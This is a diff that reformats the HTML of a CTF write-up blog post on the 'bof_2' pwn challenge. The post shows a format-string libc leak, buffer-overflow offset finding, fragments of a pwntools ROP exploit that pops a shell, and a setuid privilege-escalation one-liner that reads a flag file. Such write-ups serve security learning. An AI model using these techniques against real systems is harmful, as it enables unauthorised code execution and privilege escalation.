@@ -1,12 +1,80 @@
-<!doctype html><html lang=en><head><title>Writeup Cyber Threat Force : bof_2 (with PrivEsc) :: Nicolas Bourras</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="For this challenge, we were also given a service executable. It was also hosted remotely.
+<!doctype html><html lang=en>
+<head>
+<title>Writeup Cyber Threat Force : bof_2 (with PrivEsc) :: Nicolas Bourras</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="For this challenge, we were also given a service executable. It was also hosted remotely.
 NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
-Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_2/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments $ ./service Hello authentifie toi ! Username: vivescere Bienvenue vivescere password: mypassword oops i have lost my db sorry This time, the only protection that&amp;rsquo;s activated is PIE, which means addresses won&amp;rsquo;t be stable."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/><link rel=stylesheet href=https://nicolasb.fr/assets/style.css><link rel=stylesheet href=https://nicolasb.fr/assets/pink.css><link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Writeup Cyber Threat Force : bof_2 (with PrivEsc)"><meta property="og:description" content="For this challenge, we were also given a service executable. It was also hosted remotely.
+Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_2/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments $ ./service Hello authentifie toi ! Username: vivescere Bienvenue vivescere password: mypassword oops i have lost my db sorry This time, the only protection that&amp;rsquo;s activated is PIE, which means addresses won&amp;rsquo;t be stable.">
+<meta name=keywords content>
+<meta name=robots content="noodp">
+<link rel=canonical href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/>
+<link rel=stylesheet href=https://nicolasb.fr/assets/style.css>
+<link rel=stylesheet href=https://nicolasb.fr/assets/pink.css>
+<link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png>
+<link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png>
+<meta name=twitter:card content="summary">
+<meta name=twitter:creator content>
+<meta property="og:locale" content="en">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup Cyber Threat Force : bof_2 (with PrivEsc)">
+<meta property="og:description" content="For this challenge, we were also given a service executable. It was also hosted remotely.
 NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
-Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_2/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments $ ./service Hello authentifie toi ! Username: vivescere Bienvenue vivescere password: mypassword oops i have lost my db sorry This time, the only protection that&amp;rsquo;s activated is PIE, which means addresses won&amp;rsquo;t be stable."><meta property="og:url" content="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/"><meta property="og:site_name" content="Nicolas Bourras"><meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-07-07 20:12:09 +0100 +0100"></head><body class=pink><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Nicolas Bourras</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/>Writeup Cyber Threat Force : bof_2 (with PrivEsc)</a></h1><div class=post-meta><span class=post-date>2021-07-07</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
+Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_2/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments $ ./service Hello authentifie toi ! Username: vivescere Bienvenue vivescere password: mypassword oops i have lost my db sorry This time, the only protection that&amp;rsquo;s activated is PIE, which means addresses won&amp;rsquo;t be stable.">
+<meta property="og:url" content="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/">
+<meta property="og:site_name" content="Nicolas Bourras">
+<meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+<meta property="article:published_time" content="2021-07-07 20:12:09 +0100 +0100">
+</head>
+<body class=pink>
+<div class="container center">
+<header class=header>
+<div class=header__inner>
+<div class=header__logo>
+<a href=/>
+<div class=logo>
+Nicolas Bourras
+</div>
+</a>
+</div>
+<div class=menu-trigger>menu</div>
+</div>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about>About</a></li>
+<li><a href=/>Posts</a></li>
+<li><a href=/recipes>Recipes</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about>About</a></li>
+<li><a href=/>Posts</a></li>
+<li><a href=/recipes>Recipes</a></li>
+</ul>
+</nav>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>
+<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/>Writeup Cyber Threat Force : bof_2 (with PrivEsc)</a></h1>
+<div class=post-meta>
+<span class=post-date>
+2021-07-07
+</span>
+</div>
+<span class=post-tags>
+#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;</span><div class=post-content><div><p>For this challenge, we were also given a <code>service</code> executable. It was also hosted remotely.</p><p>NOTE: since I&rsquo;m writting this after the CTF ended, the demos are done locally.</p><h2 id=level-1>Level 1<a href=#level-1 class=hanchor arialabel=Anchor>&#8983;</a></h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ checksec service
+#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;
+</span>
+<div class=post-content><div>
+<p>For this challenge, we were also given a <code>service</code> executable. It was also hosted remotely.</p>
+<p>NOTE: since I&rsquo;m writting this after the CTF ended, the demos are done locally.</p>
+<h2 id=level-1>Level 1<a href=#level-1 class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ checksec service
 <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_2/service&#39;</span>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -21,7 +89,8 @@ Username: vivescere
 Bienvenue vivescere
 password: mypassword
 oops i have lost my db sorry
-</code></pre></div><p>This time, the only protection that&rsquo;s activated is PIE, which means addresses won&rsquo;t be stable. We can take a look at the the binary in Ghidra:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined4 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
+</code></pre></div><p>This time, the only protection that&rsquo;s activated is PIE, which means addresses won&rsquo;t be stable. We can take a look at the the binary in Ghidra:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined4 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
   ignorMe(<span style=color:#f92672>&amp;</span>stack0x00000004);
   vuln();
   puts(<span style=color:#e6db74>&#34;oops i have lost my db sorry&#34;</span>);
@@ -74,7 +143,9 @@ oops i have lost my db sorry
   }
   <span style=color:#66d9ef>return</span>;
 }
-</code></pre></div><p>There is an obvious call to <code>printf</code> with <code>local_81</code>, which we can use in a format string exploit, and a call to <code>scanf</code>, which we&rsquo;ll use for our buffer overflow.</p><p>Starting with figuring out the offset:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cyclic <span style=color:#ae81ff>100</span>  
+</code></pre></div><p>There is an obvious call to <code>printf</code> with <code>local_81</code>, which we can use in a format string exploit, and a call to <code>scanf</code>, which we&rsquo;ll use for our buffer overflow.</p>
+<p>Starting with figuring out the offset:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cyclic <span style=color:#ae81ff>100</span>  
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 $ gdb ./service
 ...
@@ -92,12 +163,14 @@ password: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara
 gef➤ q
 $ cyclic -l 0x6e616161
 <span style=color:#ae81ff>49</span>
-</code></pre></div><p>Now we need to figure out the version of the libc that was used on the remote server. To do that, we&rsquo;re going to leak a few addresses from the stack.</p><p>Using a simple script (could also have been done in GDB), we can find out which addresses come from the libc (knowing that on my system and for this executable, the libc starts at <code>0xf7cad000</code>).</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
+</code></pre></div><p>Now we need to figure out the version of the libc that was used on the remote server. To do that, we&rsquo;re going to leak a few addresses from the stack.</p>
+<p>Using a simple script (could also have been done in GDB), we can find out which addresses come from the libc (knowing that on my system and for this executable, the libc starts at <code>0xf7cad000</code>).</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
 <span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
 
 context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ERROR&#39;</span>
 
-exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>, checksec<span style=color:#f92672>=</span>False)
+exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
 
 context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
 context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]
@@ -112,14 +185,19 @@ context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</s
     <span style=color:#66d9ef>except</span>:
         leaked_addr <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>
     <span style=color:#66d9ef>if</span> hex(leaked_addr)<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#39;0xf7&#39;</span>):
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%&#39;</span> <span style=color:#f92672>+</span> str(i)<span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;$p&#39;</span>, hex(leaked_addr))
+        print(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%&#39;</span> <span style=color:#f92672>+</span> str(i)<span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;$p&#39;</span>, hex(leaked_addr))
     r<span style=color:#f92672>.</span>close()
-</code></pre></div><p>We can quickly identify the addresses that we get using GDB (<code>info symbol [addr]</code>):</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>%2$p 	  0xf7f64540 _IO_2_1_stdin_
+</code></pre></div><p>We can quickly identify the addresses that we get using GDB (<code>info symbol [addr]</code>):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>%2$p 	  0xf7f64540 _IO_2_1_stdin_
 ...
 %43$p 	0xf7dc0a0d __libc_start_main
-</code></pre></div><p>.. now we can do the same on the remote host, and plug the values into the <a href=https://libc.blukat.me>libc database search</a> website. After entering these values:</p><pre><code>__libc_start_main_ret -&gt; b41
+</code></pre></div><p>.. now we can do the same on the remote host, and plug the values into the <a href=https://libc.blukat.me>libc database search</a> website. After entering these values:</p>
+<pre tabindex=0><code>__libc_start_main_ret -&gt; b41
 _IO_2_1_stdin_        -&gt; 5c0
-</code></pre><p>We get four possible versions. I tested them all until one worked (using the exploit below). The correct version (or at least a compatible one) was <code>libc6-i386_2.28-10_amd64</code>.</p><p>Now that we know all of this, the exploit needs to 1. leak an address so that we can defeat ASLR and 2. build a simple ropchain to pop a shell.</p><p>Here is the exploit script:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
+</code></pre><p>We get four possible versions. I tested them all until one worked (using the exploit below). The correct version (or at least a compatible one) was <code>libc6-i386_2.28-10_amd64</code>.</p>
+<p>Now that we know all of this, the exploit needs to 1. leak an address so that we can defeat ASLR and 2. build a simple ropchain to pop a shell.</p>
+<p>Here is the exploit script:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
 <span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
 
 exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>)
@@ -159,7 +237,10 @@ libc_config <span style=color:#f92672>=</span> {
 
 <span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
     main()
-</code></pre></div><p>The flag was in <code>/home/ctf/flag.txt</code>: <code>CYBERTF{l3@ks_I5_Us3Fu11}</code>.</p><h2 id=level-2-privesc>Level 2: PrivEsc<a href=#level-2-privesc class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Looking in <code>/bin</code> again, we find a <code>readline</code> SETUID binary. I used the same snippet to download the file:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</code></pre></div><p>The flag was in <code>/home/ctf/flag.txt</code>: <code>CYBERTF{l3@ks_I5_Us3Fu11}</code>.</p>
+<h2 id=level-2-privesc>Level 2: PrivEsc<a href=#level-2-privesc class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>Looking in <code>/bin</code> again, we find a <code>readline</code> SETUID binary. I used the same snippet to download the file:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
     r <span style=color:#f92672>=</span> conn()
 
     r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
@@ -176,7 +257,8 @@ libc_config <span style=color:#f92672>=</span> {
         r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;cat /bin/readline&#39;</span>)
         r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;exit&#39;</span>)
         f<span style=color:#f92672>.</span>write(r<span style=color:#f92672>.</span>recvall())
-</code></pre></div><p>We can look at the binary in Ghidra:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined8 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> param_1,<span style=color:#66d9ef>long</span> param_2) {
+</code></pre></div><p>We can look at the binary in Ghidra:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined8 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> param_1,<span style=color:#66d9ef>long</span> param_2) {
   <span style=color:#66d9ef>int</span> iVar1;
   size_t sVar2;
   undefined8 uVar3;
@@ -255,9 +337,46 @@ libc_config <span style=color:#f92672>=</span> {
   }
   <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>int</span>)<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_1) <span style=color:#f92672>-</span> (<span style=color:#66d9ef>int</span>)<span style=color:#f92672>*</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)(local_10 <span style=color:#f92672>+</span> param_2);
 }
-</code></pre></div><p>The program basically takes two arguments: a password, and a file path. If the password is correct, then the file content will be printed out.</p><p>The <code>check</code> function is basically a <code>strcmp</code> clone, so the password is contained in <code>local_426</code>. Ghidra errors out a bit here, <code>local_426</code>, <code>local_41e</code> and <code>local_41a</code> are all the same variable.</p><p>Knowing this, we can now get the flag (which is in the home of the binary owner):</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ /bin/readline <span style=color:#66d9ef>$(</span>perl -e <span style=color:#e6db74>&#39;print &#34;\xde\xad\xbe\xef\x31\x32\x33\xaa\xbb\xcc\xdd\xc0\xff\xee /home/ctf_cracked/flag.txt&#34;&#39;</span><span style=color:#66d9ef>)</span>
-</code></pre></div><p>The flag is <code>CYBERTF{None_asciiPrint@ble:p}</code>.</p><h2 id=more>More<a href=#more class=hanchor arialabel=Anchor>&#8983;</a></h2><p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof2>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/><span class=button__icon>←</span>
-<span class=button__text>Writeup Cyber Threat Force : bof_3</span></a></span>
-<span class="button next"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/><span class=button__text>Writeup Cyber Threat Force : bof_1 (with GetShell & PrivEsc)</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
+</code></pre></div><p>The program basically takes two arguments: a password, and a file path. If the password is correct, then the file content will be printed out.</p>
+<p>The <code>check</code> function is basically a <code>strcmp</code> clone, so the password is contained in <code>local_426</code>. Ghidra errors out a bit here, <code>local_426</code>, <code>local_41e</code> and <code>local_41a</code> are all the same variable.</p>
+<p>Knowing this, we can now get the flag (which is in the home of the binary owner):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ /bin/readline <span style=color:#66d9ef>$(</span>perl -e <span style=color:#e6db74>&#39;print &#34;\xde\xad\xbe\xef\x31\x32\x33\xaa\xbb\xcc\xdd\xc0\xff\xee /home/ctf_cracked/flag.txt&#34;&#39;</span><span style=color:#66d9ef>)</span>
+</code></pre></div><p>The flag is <code>CYBERTF{None_asciiPrint@ble:p}</code>.</p>
+<h2 id=more>More<a href=#more class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof2>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p>
+</div></div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/>
+<span class=button__icon>←</span>
+<span class=button__text>Writeup Cyber Threat Force : bof_3</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/>
+<span class=button__text>Writeup Cyber Threat Force : bof_1 (with GetShell & PrivEsc)</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=copyright>
+<span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
+</div>
+</div>
+</footer>
+<script src=https://nicolasb.fr/assets/main.js></script>
+<script src=https://nicolasb.fr/assets/prism.js></script>
+</div>
+</body>
+</html>
